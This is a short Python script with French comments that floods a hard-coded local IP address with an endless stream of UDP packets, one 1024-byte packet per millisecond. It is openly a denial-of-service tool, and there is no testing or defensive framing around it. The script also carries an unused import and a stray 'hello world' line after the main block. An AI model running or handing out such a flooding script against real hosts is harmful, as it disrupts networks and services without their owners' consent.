import socket
import time
import threading

TARGET_IP = "192.168.99.228"
TARGET_PORT = 5000  # n'importe quel port ouvert
MESSAGE_SIZE = 1024  # taille du message en octets
DELAY_BETWEEN_PACKETS = 0.001  # 1ms entre chaque paquet

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b"A" * MESSAGE_SIZE
    while True:
        try:
            sock.sendto(message, (TARGET_IP, TARGET_PORT))
            time.sleep(DELAY_BETWEEN_PACKETS)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    print(f"Flood en cours vers {TARGET_IP}:{TARGET_PORT}...")
    flood()

print("hello world")